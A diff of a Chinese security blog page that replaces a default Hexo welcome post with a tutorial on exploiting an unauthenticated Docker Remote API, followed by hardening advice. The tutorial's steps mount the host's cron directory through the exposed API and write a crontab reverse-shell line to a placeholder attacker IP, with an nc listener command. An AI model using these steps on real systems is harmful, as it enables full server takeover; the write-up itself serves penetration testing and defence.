@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="Tachiu Lam">
   <meta name="keywords" content="">
-  <title>Hello World - Tachiu Lam</title>
+  <title>Docker Remote API 未授权访问漏洞利用 - Tachiu Lam</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
@@ -119,7 +119,7 @@
 </nav>
 
     <div class="view intro-2" id="background" parallax=true
-         style="background: url('/img/11.png') no-repeat center center;
+         style="background: url('/img/docker.png') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
@@ -132,8 +132,8 @@
               
                 <div class="mt-3 post-meta">
                   <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-                  <time datetime="2020-05-22 00:09">
-                    2020年5月22日 凌晨
+                  <time datetime="2020-05-23 18:10">
+                    2020年5月23日 晚上
                   </time>
                 </div>
               
@@ -143,7 +143,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    73 字
+                    680 字
                   </span>
                 
 
@@ -153,7 +153,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    1
+                    8
                      分钟
                   </span>
                 
@@ -182,25 +182,59 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+              <h4 id="漏洞简介及危害"><a href="#漏洞简介及危害" class="headerlink" title="漏洞简介及危害"></a>漏洞简介及危害</h4><p>Docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的LINUX机器上，也可以实现虚拟化。 Docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，由docker官方提供。</p>
+<p>Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。Docker Remote API如配置不当可导致未授权访问，攻击者利用 docker client 或者 http 直接请求就可以访问这个 API，可能导致敏感信息泄露，黑客也可以删除Docker上的数据。 攻击者可进一步利用Docker自身特性，直接访问宿主机上的敏感信息，或对敏感文件进行修改，最终完全控制服务器。</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><pre><code class="hljs plain"># 靶机IP&#x2F;端口
+172.19.101.34 2375
+# 操作系统
+linux_x86</code></pre>
+<h5 id="未授权访问测试"><a href="#未授权访问测试" class="headerlink" title="未授权访问测试"></a>未授权访问测试</h5><pre><code class="hljs plain">docker tcp:&#x2F;&#x2F;172.19.101.34:2375 --version
 
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+# 返回版本信息，漏洞存在
+Docker version 19.03.5, build 633a0ea</code></pre>
+<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><pre><code class="hljs plain"># 在攻击主机上打开8088端口监听
+[root@]# nc -vv -l -p 8088</code></pre>
+<h5 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h5><p>创建容器，利用bash和crontab计划任务向宿主机写入shell，centos系统挂载路径为。 /var/spool/cron/root；ubuntu系统为/var/spool/cron/crontabs/root；</p>
+<pre><code class="hljs plain"># 查看宿主机可用镜像
+docker tcp:&#x2F;&#x2F;172.19.101.34:2375 image
 
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+# 选择合适镜像创建容器
+docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 run -it -v &#x2F;var&#x2F;spool&#x2F;cron&#x2F;:&#x2F;var&#x2F;spool&#x2F;cron&#x2F; image_id &#x2F;bin&#x2F;bash
 
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+# 启动刚刚创建的容器并连接
+docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 start ct_id
+docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 exec -it --user root ct_id &#x2F;bin&#x2F;bash
 
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+# 执行shell反弹命令
+root@bfd2539dfdc8:&#x2F;# echo &#39;* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;8088 0&gt;&amp;1&#39; &gt;&gt; &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</code></pre>
+<h5 id="成功反弹宿主机shell"><a href="#成功反弹宿主机shell" class="headerlink" title="成功反弹宿主机shell"></a>成功反弹宿主机shell</h5><p><img src="/img/docker_res.png" srcset="/img/loading.gif" alt="image"></p>
+<blockquote>
+<p>P.S ，测试完记得删掉存在漏洞的容器</p>
+</blockquote>
+<h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>临时解决方案：</p>
+<p>1、对2375端口做网络访问控制，如设置iptables策略仅允许指定的IP来访问Docker接口；</p>
+<p>2、修改docker swarm的认证方式，使用TLS认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行。</p>
+<p><strong>总之、不要将端口直接暴露在公网，内网中使用需要设置严格的访问规则，并使用TLS。</strong></p>
 
             </article>
             <hr>
             <div>
               <div class="post-metas mb-3">
                 
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%AE%89%E5%85%A8/">安全</a>
+                    
+                  </div>
                 
               </div>
               
@@ -211,15 +245,15 @@
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/2020/05/23/Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Docker Remote API 未授权访问漏洞利用</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-6">
                     
+                    
+                      <a href="/2020/05/22/hello-world/">
+                        <span class="hidden-mobile">Hello World</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </div>
                 </div>
@@ -398,7 +432,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "Hello World&nbsp;",
+        "Docker Remote API 未授权访问漏洞利用&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
